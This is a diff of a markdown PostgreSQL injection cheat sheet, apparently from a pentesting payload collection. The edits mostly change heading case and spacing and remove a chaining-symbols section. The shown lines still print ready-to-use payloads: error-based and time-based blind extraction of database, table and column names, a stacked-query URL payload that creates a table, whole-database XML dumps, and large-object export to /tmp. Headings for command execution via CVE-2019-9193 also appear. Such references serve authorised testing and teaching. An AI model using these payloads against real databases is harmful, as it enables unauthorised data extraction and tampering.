@@ -1,9 +1,12 @@
-# PostgreSQL injection
+# PostgreSQL Injection
+
+> 
+
 
 ## Summary
 
 * [PostgreSQL Comments](#postgresql-comments)
-* [PostgreSQL version](#postgresql-version)
+* [PostgreSQL Version](#postgresql-version)
 * [PostgreSQL Current User](#postgresql-current-user)
 * [PostgreSQL List Users](#postgresql-list-users)
 * [PostgreSQL List Password Hashes](#postgresql-list-password-hashes)
@@ -11,21 +14,22 @@
 * [PostgreSQL List Privileges](#postgresql-list-privileges)
 * [PostgreSQL Check if Current User is Superuser](#postgresql-check-if-current-user-is-superuser)
 * [PostgreSQL database name](#postgresql-database-name)
-* [PostgreSQL List databases](#postgresql-list-database)
-* [PostgreSQL List tables](#postgresql-list-tables)
-* [PostgreSQL List columns](#postgresql-list-columns)
+* [PoStgresql List Databases](#postgresql-list-database)
+* [PostgreSQL List Tables](#postgresql-list-tables)
+* [PostgreSQL List Columns](#postgresql-list-columns)
 * [PostgreSQL Error Based](#postgresql-error-based)
 * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
 * [PostgreSQL Blind](#postgresql-blind)
 * [PostgreSQL Time Based](#postgresql-time-based)
-* [PostgreSQL Stacked query](#postgresql-stacked-query)
+* [PostgreSQL Stacked Query](#postgresql-stacked-query)
 * [PostgreSQL File Read](#postgresql-file-read)
 * [PostgreSQL File Write](#postgresql-file-write)
-* [PostgreSQL Command execution](#postgresql-command-execution)
+* [PostgreSQL Command Execution](#postgresql-command-execution)
     * [CVE-2019–9193](#cve-20199193)
     * [Using libc.so.6](#using-libcso6)
 * [Bypass Filter](#bypass-filter)
 * [References](#references)
+
 
 ## PostgreSQL Comments
 
@@ -34,15 +38,6 @@
 /**/  
 ```
 
-## PostgreSQL chain injection points symbols
-```sql
-; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.
-|| #or statement 
-
-# usage examples: 
-/?whatever=1;(select 1 from pg_sleep(5))
-/?whatever=1||(select 1 from pg_sleep(5))
-```
 
 ## PostgreSQL Version
 
@@ -136,7 +131,7 @@ SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
 ```
 
-## PostgreSQL XML helpers
+## PostgreSQL XML Helpers
 
 ```sql
 select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
@@ -151,6 +146,7 @@ select database_to_xmlschema(true,true,''); -- dump the current db to an XML sch
 
 Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.
 
+
 ## PostgreSQL Blind
 
 ```sql
@@ -160,7 +156,7 @@ Note, with the above queries, the output needs to be assembled in memory. For la
 
 ## PostgreSQL Time Based
 
-#### Identify time based
+#### Identify Time Based
 
 ```sql
 select 1 from pg_sleep(5)
@@ -168,16 +164,20 @@ select 1 from pg_sleep(5)
 ||(select 1 from pg_sleep(5))
 ```
 
-#### Database dump time based
+#### Database Dump Time Based
+
 ```sql
 select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
 ```
 
-#### Table dump time based
+#### Table Dump Time Based
+
 ```sql
 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
 ```
-#### columns dump time based
+
+#### Columns Dump Time Based
+
 ```sql
 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
@@ -191,11 +191,12 @@ AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 
 ## PostgreSQL Stacked Query
 
-Use a semi-colon ";" to add another query
+Use a semi-colon "`;`" to add another query
 
 ```sql
 http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
 ```
+
 
 ## PostgreSQL File Read
 
@@ -238,7 +239,7 @@ SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at
 SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
 ```
 
-## PostgreSQL Command execution
+## PostgreSQL Command Execution
 
 ### CVE-2019–9193
 
